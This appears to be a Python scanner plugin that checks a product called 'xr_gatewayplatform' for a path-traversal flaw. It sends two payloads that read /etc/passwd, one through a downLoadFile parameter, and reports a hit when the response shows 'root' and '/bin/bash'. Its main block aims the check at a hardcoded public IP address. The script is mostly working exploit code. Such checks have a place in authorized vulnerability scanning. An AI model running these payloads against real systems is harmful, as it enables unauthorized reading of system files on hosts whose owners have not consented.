#!/usr/bin/env python

import re

def assign(service, arg):
    if service == "xr_gatewayplatform":
        return True, arg

def audit(arg):
    payloads = ['msa/../../../../../../../../etc/passwd', '/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=test.txt+downLoadFile=../etc/passwd']
    for payload in payloads: 
        url = arg + payload
        code, head, res, errcode, _ = curl.curl(url)
        if code == 200 and 'root' in res and '/bin/bash' in res:
                security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('xr_gatewayplatform', 'http://112.16.141.6/')[1])